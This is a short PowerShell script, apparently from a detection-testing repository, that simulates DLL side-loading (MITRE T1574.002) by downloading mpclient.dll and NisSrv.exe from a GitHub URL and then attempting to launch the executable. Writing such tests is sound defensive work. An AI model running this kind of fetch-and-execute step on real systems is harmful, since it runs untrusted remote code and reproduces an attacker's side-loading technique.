# Create folder on desktop for testing
if (!(Test-Path "c:\$env:USERNAME\Desktop\DLL-Sideloading")){
    New-Item -ItemType Directory "c:\$env:USERNAME\Desktop\DLL-Sideloading"
}

# Download the necessary files
Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/mpclient.dll" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\mpclient.dll"
Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/NisSrv.exe" -OutFile "c:\$env:USERNAME\Desktop\DLL-Sideloading\NisSrv.exe"

# Execute
"c:\$env:USERNAME\Desktop\DLL-Sideloading\NisSrv.exe"